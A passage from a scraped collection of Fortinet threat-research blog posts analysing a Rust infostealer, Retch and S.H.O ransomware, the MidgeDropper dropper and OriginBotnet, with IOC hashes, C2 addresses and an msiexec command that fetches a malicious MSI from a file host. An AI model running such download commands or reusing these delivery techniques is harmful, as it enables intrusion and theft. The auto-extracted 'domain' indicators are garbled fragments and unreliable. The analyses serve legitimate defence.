soldiers from Azerbaijan and Armenia. The memo is in HTML format and usesHTML smugglingto automatically deliver a password-protected archive. This archive, as the memo suggests, contains several images. As shown in the attack diagram in Figure 3, the archive contains three clean images and one phony image. The actual contents are illustrated below. An astute observer may notice that the first \"image\" is not an image file. In reality, it is a . LNK shortcut that executes the following command: ..\\..\\Windows\\System32\\msiexec.exe /i \"https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi? rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0\" This command downloads an . MSI (Microsoft Installer) file. Figure 3 shows this MS installer file performing two actions when clicked. The first action is to display an image with the same filename as the phony image shortcut (shown in the zip archive in Figure 4): This technique may fool some users into thinking the shortcut was simply an image file. But this is misdirection. Instead, the installer simultaneously loads hidden malware into the targeted computer. The malicious installer creates a new folder in the user’s %APPDATA% folder called “Windows Defender Health Check.” It also installs malware with the same name: C:\\Users\\[username]\\AppData\\Roaming\\Windows Defender Health Check\\WindowsDefenderHealthcheck.exe This malware is programmed in RUST, which is not the programming language of choice for most malware authors. This makes using standard analysis tools and methods somewhat less useful. The fact that RUST is used already makes this threat actor different. However, this is not the only trait that makes this malware distinct. For persistence, a temporary file is created called “24rp.xml.” This file is used to create a scheduled task. Once the scheduled task is created, the . XML file is deleted. This technique assumes that the intended targets leave their computers on overnight so the malware can execute outside regular office hours when it is less likely to be noticed. Moreover, for even greater stealth, the malware can sleep for random amounts of time when performing its tasks. Next, we will refer back to Figure 2 for another indication of how this malware attempts to stay hidden. Notice the memo is dated August 8th. By examining its compile timestamp, we found that this malware was created the previous day. This short timeframe makes it virtually impossible to accidentally release the malware before the attack starts. Ultimately, the malware acts like an infostealer, gathering basic computer information and sending it to a C2 server. The following commands are executed: These commands suggest that the threat actor is still in the early stages of attempting to fully compromise its targets. The information being gathered from these commands could be used to tailor specific attacks for each infected target. This infostealer is unique because it also collects a list of environment variables and takes an extra step to check for any proxy servers in use. Figure 10. Checking for proxy If a proxy server is set, the malware understands how to route its traffic. The malware issues a POST request to send the encrypted information it stole to a C2 server owned by the threat actor, 78[.]135.73.140, through port 35667. Our telemetry found nothing too interesting with the C2 server itself. However, digging into the server uncovered additional information. Using data from PDNS and other records, the C2 server 78[.]135.73.140 does not seem to be a shared server. This suggests the threat actor has total control and setup of the server. With this assumption, we searched to discover more of the threat actor’s network infrastructure. Inside the /24 subnet alone, four additional servers were revealed: Using the August 8thdate on the memo as a starting point, we searched traffic going to these servers in the month prior. While we did not find significant amounts of traffic, we identified one IP address in Colombia that connected to the server 78[.]135.73.188 in July on a port commonly used for VPN for a substantial amount of time. If the threat actor wanted to hide their activity, using a VPN server under their control would accomplish the job. The Colombia IP address belongs to a cellular company, which suggests the user may have been using a mobile hotspot. If so, this may be the location of the attacker. The threat actor in this campaign uses a few advanced techniques, including RUST and after-hours execution, to help it stay under the radar and make analysis more difficult. The size of the network infrastructure also suggests this threat actor is not a run-of-the-mill malware developer but someone with access to resources. And the use of a geopolitical rule indicates that this threat actor is plugged in and knows how to target specific users. Fortinet customers are already protected from these malware samples through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the relevant samples with the following AV signatures: The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. TheFortiGuard AntiVirusservice is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 2A71BA3FEF819AB9FF3347CF71EEA37766B1E80FDBC1B53C83DD3B19CE71EBFD ARMENIAN_ACT_OF_AGGRESSION.pdf.html 17B3ACB560E979556207B8E7E41A086F6F147381E2FFD1CE672D663A526B1FB5 Armenian Aggression.zip 04725FB5A9E878D68E03176364F3B1057A5C54CCA06EC988013A508D6BB29B42 1. KARABAKH.jpg.lnk 35F2F7CD7945F43D9692B6EA39D82C4FC9B86709B18164AD295CE66AC20FD8E5 karabakh.jpg.msi 5327308FEE51FC6BB95996C4185C4CFCBAC580B747D79363C7CF66505F3FF6DB WindowsDefenderHealthcheck.exe https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi?rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0 78[.]135.73.140 78[.]135.73.147 78[.]135.73.162 78[.]135.73.183 78[.]135.73.188 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. advanced malware,microsoft FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/threat-Actors-exploit-the-tensions-between-azerbaijan-and-armenia",
      "scraped_at": "2025-07-20T13:53:11.802704",
      "indicators": {
        "ip_address": [],
        "domain": [
          "siexec",
          "ARABAKH",
          "indowsDefenderHealthcheck",
          "arabakh",
          "df",
          "ggression",
          "4rp"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "5327308FEE51FC6BB95996C4185C4CFCBAC580B747D79363C7CF66505F3FF6DB",
          "17B3ACB560E979556207B8E7E41A086F6F147381E2FFD1CE672D663A526B1FB5",
          "04725FB5A9E878D68E03176364F3B1057A5C54CCA06EC988013A508D6BB29B42",
          "2A71BA3FEF819AB9FF3347CF71EEA37766B1E80FDBC1B53C83DD3B19CE71EBFD",
          "35F2F7CD7945F43D9692B6EA39D82C4FC9B86709B18164AD295CE66AC20FD8E5"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://dl"
        ]
      },
      "threat_score": 0.5485611510791367
    }
  },
  {
    "id": "Fortinet_13450",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Retch and S. H. O.",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Retch and S. H. O ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Retch is a new ransomware variant first discovered in mid-August 2023. It encrypts files on compromised machines and leaves two ransom notes asking victims to pay a ransom for file decryption. Information about the infection vector used by the Retch ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Retch ransomware samples have been submitted to a public file scanning service from the following countries: Once the ransomware runs, it looks for and encrypts files with the following file extensions: .txt, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpeg, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .mp4, .7z, .rar, .m4a, .wma, .avi, .wmv, .d3dbsp, .zip, .sie, .sum, .ibank, .t13, .t12, .qdf, .gdb, .tax, .pkpass, .bc6, .bc7, .bkp .qic, .bkf, .sidn, .sidd, .mddata, .itl, .itdb, .icxs, .hvpl, .hplg, .hkdb, .mdbackup, .syncdb, .gho, .cas, .svg, .map, .wmo, .itm, .sb, .fos .mov, .vdf, .ztmp .sis, .sid, .ncf, .menu, .layout, .dmp, .blob, .esm, .vcf, .vtf, .dazip, .fpk, .mlx, .kf, .iwd, .vpk, .tor, .psk, .rim, .w3x, .fsh, .ntl, .arch00, .lvl, .snx, .cfr, .ff, .vpp_pc, .lrf, .m2, .mcmeta, .vfs0, .mpqge, .kdb, .db0, .dba, .rofl, .hkx, .bar, .upk, .das, .iwi, .litemod, .asset, .forge, .ltx, .bsa, .apk, .re4, .sav, .lbf, .slm, .bik, .epk, .rgss3a, .pak, .big, .wallet, .wotreplay, .xxx, .desc, .py, .m3u, .flv, .js, .css, .rb, .p7c, .pk7, .p7b, .p12, .pfx, .pem, .crt, .cer, .der, .x3f, .srw, .pef, .ptx, .r3d, .rw2, .rwl, .raw, .raf, .orf, .nrw, .mrwref, .mef, .erf, .kdc, .dcr, .cr2, .crw, .bay, .sr2, .srf, .arw, .3fr, .dng, .jpe, .jpg, .cdr, .indd, .ai, .eps, .pdf, .pdd, .dbf, .mdf, .wb2, .rtf, .wpd, .dxg, .xf, .dwg, .pst, .accdb, .pptm, .xlk, .xlsb, .xlsm, .wps, .docm, .odb, .odc, .odm, .odp, .ods, .cs, .exe, .lnk, .mpeg, .mp3, .mkv, .divx, .ogg, .wav, .bat, .index, .flac, .vob, .mpg The following directories are excluded from file encryption: The ransomware adds a “. Retch” extension to encrypted files. It then drops a ransom note labeled \"Message.txt\" in every folder where files are encrypted. In the ransom note, the Retch attacker asks victims to pay Bitcoins worth 300 euros for file decryption. Due to the low ransom demand, Retch ransomware is likely used to target consumers rather than enterprises. As shown in Figure 2, the ransom message is available in French and English, leading us to believe that the Retch ransomware primarily targets French users. However, further investigation revealed that this isn't the case. We also discovered that the ransom note dropped on the Desktop differs from “Message.txt.” The ransom note left on the Desktop is labeled “HOW TO RECOVER YOUR FILES.txt” and asks victims to pay Bitcoin worth $1000 for file decryption. This ransom note has a different contact email address and includes the attacker’s Bitcoin wallet address. It turns out that the Retch ransomware was developed based on a publicly available ransomware source code that claims to be for educational purposes, which appears to be based on a well-known open-source ransomware, “HiddenTear.” The open-source ransomware has the ransom note shown in Figure 2 by default. The attacker appears to have only customized the ransom note on the desktop, which is only in English, leaving the ransom notes in all other locations untouched. This indicates that the Retch ransomware was not targeting French users as we first thought. As mentioned, the countries from which the files were submitted to the public file scanning service are widespread, further suggesting our suspicion is correct. At the time of our investigation, the attacker’s Bitcoin wallet had not recorded any transactions. Information about the infection vector used by the S. H. O ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. S. H. O ransomware samples have been submitted to a public file scanning service from the following countries: After the ransomware runs, it encrypts files on compromised machines and adds five random letters and numbers as a file extension. S. H. O attempts to encrypt files with the following extensions: .myd, .ndf, .qry, .sdb, .sdf, .tmd, .tgz, .lzo, .txt, .jar, .dat, .contact, .settings, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpg, .mka, .mhtml, .oqy, .png, .csv, .py, .sql, .indd, .cs, .mp3, .mp4, .dwg, .zip, .rar, .mov, .rtf, .bmp, .mkv, .avi, .apk, .lnk, .dib, .dic, .dif, .mdb, .php, .asp, .aspx, .html, .htm, .xml, .psd, .pdf, .xla, .cub, .dae, .divx, .iso, .7zip, .pdb, .ico, .pas, .db, .wmv, .swf, .cer, .bak, .backup, .accdb, .bay, .p7c, .exif, .vss, .raw, .m4a, .wma, .ace, .arj, .bz2, .cab, .gzip, .lzh, .tar, .jpeg, .xz, .mpeg, .torrent, .mpg, .core, .flv, .sie, .sum, .ibank, .wallet, .css, .js, .rb, .crt, .xlsm, .xlsb, .7z, .cpp, .java, .jpe, .ini, .blob, .wps, .docm, .wav, .3gp, .gif, .log, .gz, .config, .vb, .m1v, .sln, .pst, .obj, .xlam, .djvu, .inc, .cvs, .dbf, .tbi, .wpd, .dot, .dotx, .webm, .m4v, .amv, .m4p, .svg, .ods, .bk, .vdi, .vmdk, .onepkg, .accde, .jsp, .json, .xltx, .vsdx, .uxdc, .udl, .3ds, .3fr, .3g2, .accda, .accdc, .accdw, .adp, .ai, .ai3, .ai4, .ai5, .ai6, .ai7, .ai8, .arw, .ascx, .asm, .asmx, .avs, .bin, .cfm, .dbx, .dcm, .dcr, .pict, .rgbe, .dwt, .f4v, .exr, .kwm, .max, .mda, .mde, .mdf, .mdw, .mht, .mpv, .msg, .myi, .nef, .odc, .geo, .swift, .odm, .odp, .rar, .orf, .pfx, .p12, .pl, .pls, .safe, .tab, .vbs, .xlk, .xlm, .xlt, .xltm, .svgz, .slk, .tar.gz, .dmg, .ps, .psb, .tif, .rss, .key, .vob, .epsp, .dc3, .iff, .opt, .onetoc2, .nrw, .pptm, .potx, .potm,.pot, .xlw, .xps .xsd, .xsf, .xsl, .kmz, .accdr, .stm, .accdt, .ppam, .pps, .ppsm, .exe, .p7b, .wdb, .sqlite, .sqlite3, .dacpac, .zipx, .lzma, .z, .tar.xz, .pam, .r3d, .ova, .1c, .dt, .c, .vmx, .xhtml, .ckp, .db3, .dbc, .dbs, .dbt, .dbv, .frm, .mwb, .mrg, .txz, .mrg, .vbox, .wmf, .wim, .xtp2, .xsn, .xslt The following files are excluded in all directories: These directories are also excluded from having their contents encrypted: S. H. O encrypts each file using an RSA public key and the Microsoft “Rijndael Managed” C# library. Upon completing the encryption run, it replaces the Desktop wallpaper with its own that asks victims to find and read the file “readme.txt,” which is a ransom note. FortiGuard Labs has identified two S. H. O ransomware variants that leave different ransom notes. Although the ransom notes have different Bitcoin addresses belonging to the attacker, the ransom fee stays consistent at $200. The ransom messages have a very fearful and ominous tone that may be an attempt to scare victims into paying the ransom. Neither of the Bitcoin wallets was available at the time of our investigation. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Retch ransomware samples with the following AV signature: FortiGuard Labs detects the S. H. O ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 46ccde0b58abeec8e3e62eed462bbf663efd4c0027c692210b2922a2217fcaac Retch ransomware a928964f062125cc32863a361a0554939f391a2e54a614c9c20c441f638a2f20 f7ab2da0e0ba7e0290b74fea2f0438de4ba3b460f99c4c869285edb9bff5b846 79972890083f7e47a3a221bff96ba5229618355cba24b685cc08e7f5672b2b7a d2b9de087fdc05071283cb162bd94bf6608ccc3e09ca3b9e7ccafffd13e084d0 C:\\Users\\IlIlIlIlIlIlIlIl\\Desktop\\TEMPLATE AND MASTERS 09032023\\ransomware-master werkING for obfuscation\\Gendarmerie B. V.3\\obj\\Release\\teste25.pdb Retch PDB String D:\\SEPTEMBER WORKS\\Gendarmerie ransomware-master_ one page Current Sun 08 12 23\\ransomware-master\\Gendarmerie B. V.3\\obj\\Debug\\Gendarmerie_300.pdb 907f6b56a13e377293fb142de08c023b2f75b7dc321ea6976868a99dac2ebdc3 S. H. O ransomware dcff6ed7acfa665af1cc31a005ccfcbdb79614a6749af6b4c3ff29ef1774008d tUsmRqlrj5UCBgSc7H35O5BwodM0FI9hbK1VBimv/pjcWj9uAPjjfkyX28MAH nPKlHhfqk7rG0N1cVf46VOqW2tPDF91kCQmB2PATst0yfz5hmQUkvazSid78f qwR43XwoQu4RwKmRxlzprZfHTTmiJP1zRyQlGOT7zrPWdS+3sdR9MkjBWl +nZUPBuRE7ApNSWt0M9M61P3psNkfDkEcaguzYkBv+ptpKRTTrK3ppstxhD KVdRuXOBlcZKNsiRciFOE8PdapN+8T0z7jOU9b5PE2vAeewKw5zOXwI6PDb DVEpRZHcXhNrcaKIXqO5OsXAi5/tGsk05QtEn/uBpzpQ== RSA Public Key S. H. O ransomware’s RSA Public Key Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-retch-and-sho",
      "scraped_at": "2025-07-20T13:53:19.288035",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ar",
          "eadme",
          "ILES",
          "este25",
          "essage"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "907f6b56a13e377293fb142de08c023b2f75b7dc321ea6976868a99dac2ebdc3",
          "46ccde0b58abeec8e3e62eed462bbf663efd4c0027c692210b2922a2217fcaac",
          "79972890083f7e47a3a221bff96ba5229618355cba24b685cc08e7f5672b2b7a",
          "a928964f062125cc32863a361a0554939f391a2e54a614c9c20c441f638a2f20",
          "d2b9de087fdc05071283cb162bd94bf6608ccc3e09ca3b9e7ccafffd13e084d0",
          "dcff6ed7acfa665af1cc31a005ccfcbdb79614a6749af6b4c3ff29ef1774008d",
          "f7ab2da0e0ba7e0290b74fea2f0438de4ba3b460f99c4c869285edb9bff5b846"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4886561954624782
    }
  },
  {
    "id": "Fortinet_13523",
    "source": "Fortinet",
    "title": "New MidgeDropper Variant",
    "text": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium One of the most exciting aspects of malware analysis is coming across a family that is new or rare to the reversing community. Determining the function of the malware, who created it, and the reasons behind it become a mystery to solve. The previously unseen dropper variant we recently found, named MidgeDropper, has a complex infection chain that includes code obfuscation and sideloading, making it an interesting use case. Although we couldn’t obtain the final payload, this blog will still explore what makes this dropper tick. The initial infection vector was not available to FortiGuard Labs at the time of our investigation. However, we strongly suspect it to be a phishing e-mail because we have access to an RAR archive—! PENTING_LIST OF OFFICERS.rar—that would have been the likely attachment to an e-mail. Two files are in the ! PENTING_LIST OF OFFICERS.rar archive: “Notice to Work-From-Home groups.pdf” and “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” (Figure 1). The “Notice to Work-From-Home groups.pdf” file is exactly what it appears to be: a PDF file. It contains an image of an error message that falsely indicates that the PDF document failed to load. It is designed to act as a decoy and shift the recipient’s attention to clicking on and executing the “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file. Since file extensions are hidden by default in Windows, it is unlikely that anyone reviewing the contents would see the “.exe” and would instead assume they were opening another PDF file. At 6.7MB, the ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file is large by malware delivery standards. This executable primarily functions as a dropper for the following stages of infection. The executable drops the files “Microsoft Office.doc,” “IC.exe,” “power.exe,” and “power.xml”. It also reaches out to “hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe” to pull down the file “seAgnt.exe.” This file is dropped and opened from “C:\\Users\\<user>\\AppData\\Local\\Temp\\Microsoft\\Office.” It is also meant to be a decoy. It is populated in some versions of the dropper, but it was empty and benign in the version analyzed by FortiGuard Labs. “IC.exe” is dropped by “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” and deposited into “C:\\ProgramData\\Emisoft\\Microsoft\\Stream\\IC.exe.” It is responsible for obtaining the next stage of the infection. “IC.exe” reaches out to a URL at “185[.]225[.]68[.]37” to download an additional file, “VCRUNTIME140_1.dll.” As can probably be guessed by the filename, “VCRUNTIME140_1.dll” is meant to appear as a file related to the Microsoft Visual C++ Redistributable Package. “power.exe” is dropped along with “power.xml” by ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe”. “power.exe” only has one job: decoding and processing “power.xml.” Figure 9 shows that “power.xml” in its native format is obfuscated and not readily readable. This can be easily rectified by removing the garbage characters used for obfuscation. With obfuscation removed, an XML document remains. Much of the information is irrelevant except for the final section under the “Actions” tag. The primary purpose of this pair of files is to launch “seAgnt.exe.” “seAgnt.exe” is a renamed copy of “GameBarFTServer.exe,” which is an application published by Microsoft, “Xbox Game Bar Full Trust COM Server.” It is a background process for the Xbox Game Bar that runs on Windows. Although itself benign, “seAgnt.exe” does depend on “VCRUNTIME140_1.dll”. This dependency allows the malicious code inside of the DLL to execute. “VCRUNTIME140_1.dll” is a legitimate DLL that is part of the Microsoft Visual C++ runtime package. Unfortunately, the particular version used here is malicious. Due to “VCRUNTIME140_1.dll” being a Dynamic Link Library, it doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. “seAgnt.exe” is that application. This technique is called sideloading (https://attack.mitre.org/techniques/T1574/002/) because a dependency of a legitimate application is highjacked to allow the malicious code to load. The file is heavily obfuscated and designed to make analysis much more difficult. For example, the figure below shows the massive number of function jumps that attempt to hide the purpose of the code. The rest of the code makes it equally difficult to follow along in a disassembler. The primary purpose of the code appears to be reaching out to “hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat” to pull down the file “35g3498734gkb.dat”. Oddly, “35g3498734gkb.dat” is identical to “VCRUNTIME140_1.dll” in terms of the file hash, so it’s unclear why the threat actor opted to pull it down again from the C2 node. Unfortunately, further links on the infection chain were taken down when our analysis began, preventing further analysis of any potential final payloads. Despite the final payload being unavailable before FortiGuard Labs could analyze it, this dropper made an interesting case study and provided a subject to watch out for. Fortinet customers are already protected from this malware through FortiGuard’sWeb Filtering,AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. ! PENTING_LIST OF OFFICERS.rar 2dcf00b0f6c41c2c60561ca92893a0a9bf060e1d46af426de022d0c5d23d8704 Notice to Work-From-Home groups.pdf 30417ca261eefe40f7c44ff956f9940b766ae9a0c574cd1c06a4b545e46f692e 062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe c22cc7111191e5a1a2010f4bc3127058bff41ecba8d753378feabee37d5b43bb Microsoft Office.doc 59334a6e2c5faabe3a1baf5347ba01f2419d731fcbb7ab1b021185c059c8fa6f fc40e782731b8d3b9ec5e5cf8a9d8b8126dc05028ca58ec52db155b3dadc5fc6 f26f5a52bddda5eb3245161b784b58635ffa2381818816e50b8bae9680ff88eb f43cca8d2e996ee78edf8d9e64e05f35e94a730fbe51e9feecc5e364280d8534 b3e0388f215ac127b647cd7d3f186f2f666dc0535d66797b6e1adb74f828254e VCRUNTIME140_1.dll / 35g3498734gkb.dat 527afa0c415af005594acaac1093a1ea79e3639fa5563602497eabbae7438130 185[.]225[.]69[.]226 hXXp://185[.]225[.]68[.]37/jay/nl/VCRUNTIME140_1.dll Stage download location hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe Stage download location hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat Stage download location FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-midgedropper-variant",
      "scraped_at": "2025-07-20T13:53:27.606823",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ttack",
          "eAgnt",
          "EPORT",
          "ffice",
          "5g3498734gkb",
          "FFICERS",
          "C",
          "ower",
          "roups",
          "ameBarFTServer"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "527afa0c415af005594acaac1093a1ea79e3639fa5563602497eabbae7438130",
          "fc40e782731b8d3b9ec5e5cf8a9d8b8126dc05028ca58ec52db155b3dadc5fc6",
          "59334a6e2c5faabe3a1baf5347ba01f2419d731fcbb7ab1b021185c059c8fa6f",
          "f43cca8d2e996ee78edf8d9e64e05f35e94a730fbe51e9feecc5e364280d8534",
          "b3e0388f215ac127b647cd7d3f186f2f666dc0535d66797b6e1adb74f828254e",
          "f26f5a52bddda5eb3245161b784b58635ffa2381818816e50b8bae9680ff88eb",
          "30417ca261eefe40f7c44ff956f9940b766ae9a0c574cd1c06a4b545e46f692e",
          "2dcf00b0f6c41c2c60561ca92893a0a9bf060e1d46af426de022d0c5d23d8704",
          "c22cc7111191e5a1a2010f4bc3127058bff41ecba8d753378feabee37d5b43bb"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://attack.mitre.org/techniques/T1574/002/"
        ]
      },
      "threat_score": 0.5577689243027889
    }
  },
  {
    "id": "Fortinet_35106",
    "source": "Fortinet",
    "title": "OriginBotnet Spreads via Malicious Word Document",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrencySeverity level:Critical In August, FortiGuard Labs obtained a Word document containing a malicious URL designed to entice victims to download a malware loader. This loader employs a binary padding evasion strategy that adds null bytes to increase the file's size to 400 MB. The payloads of this loader include OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft, and AgentTesla for harvesting sensitive information. Figure 1 illustrates the comprehensive attack flow. In this blog, we examine the various stages of how the file is deployed and delve into the specifics of the malware it delivers. Aphishingemail delivers the Word document as an attachment, presenting a deliberately blurred image and a counterfeit reCAPTCHA (Figure 2) to lure the recipient into clicking on it. Clicking activates an embedded malicious link in the file “\\word_rels\\document.xml.rels,” as shown in Figure 3. The initial loader was acquired from https://bankslip[.]info/document/scancop20233108[.]exe. This file, written in . NET, deciphers the “Main_Project” resource data in “HealthInstitutionSimulation. Properties. Resources.resources.” It uses an XOR operation with the string “WdxDFWxcf09WXfVVjLwKKcccwnawf” and then 'Activator. CreateInstance()' to execute the decoded information. The decoding procedure is shown in Figure 4. The second stage uses the “Main Project.dll” with the entry point illustrated in Figure 5. In this stage, the code initiates a “Sleep()” function within “Delation()” and establishes persistence through the “Moschop()” function. It then loads Base64-encoded strings and uses the AES-CBC algorithm for decryption, retrieving a PowerShell command, as shown in Figure 6. To ensure persistence, it duplicates the EXE file into the directory “%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” under the filename “audacity.exe.exe” to ensure that the file runs automatically even if the victim restarts their device. Following that, it employs the command “GetType(‘I. L’). GetMethod(‘U’)” to invoke a method from the DLL that was decrypted from the resources labeled “DataPresent.” This is passed to the third-stage payload, decrypted from the data within the resources labeled “Moss,” using the AES-ECB algorithm, as shown in Figure 7. The third stage uses “scancopper4647979413.exe,” which is another . NET executable file. It utilizes the “Activator. CreateInstance()” method to generate an instance decoded from the resources, “rumdisintegration.dat,” effectively triggering the execution of the fourth-stage file, “cargomind.dll.” It then uses the “CreateInstance()” method with two parameters: the object type for instantiation and an array of arguments to be transmitted to the created object. The fourth stage is represented by a DLL file, “cargomind.dll.” Its entry point is shown in Figure 9. It comprises three Base64-encoded strings intended for subsequent operations. The “Deserialize()” function, as shown in Figure 10, is responsible for decoding these strings, parsing the key-value pairs for each option, and ultimately returning a dictionary. Figure 11 displays the result obtained from “list2.” It reveals the existence of three tasks, each comprising six distinct options. Let's explore the options within “list2[0]” in detail: For the remaining two tasks in “list2,” the action is set to “b.” Consequently, it invokes the “ExecuteBinder()” function to decode data specified in the “r_k” option, as shown in Figure 14. The targeted files in this context are “newcrisp.dat” and “backyard.dat,” both sourced from the resources section of the prior stage, “scancopper46477979413.exe,” as shown in Figure 15. The initial malware originates from the URL https://softwarez[.]online/javau[.]exe. It is a . NET executable file that has been packed using SmartAssembly. Upon deciphering the resource data, we uncovered the ultimate payload, “RedLine Clipper,” as shown in Figure 16. RedLine Clipper (SHA256: 4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3), also known as ClipBanker, specializes in stealing cryptocurrencies by manipulating the user's system clipboard activities to substitute the destination wallet address with one belonging to the attacker. The compromised version (Figure 17) supports cryptocurrencies, including Bitcoin, Ethereum, Dogecoin, Litecoin, Dashcoin, and Monero. It continually monitors the clipboard for a copied coin wallet address, which is typically lengthy and complex, making manual entry impractical. When a wallet address is detected on the clipboard, RedLine Clipper covertly alters it to match the attacker's wallet address. Ordinarily, cryptocurrency wallet addresses adhere to specific formats, but due to their complexity, users often copy and paste them during transactions. Consequently, if the wallet address is tampered with at this stage, users intending to send funds to a particular wallet may inadvertently deposit them into the attacker's wallet instead. To carry out this operation, RedLine Clipper utilizes the “OnClipboardChangeEventHandler” to regularly monitor clipboard changes and verify if the 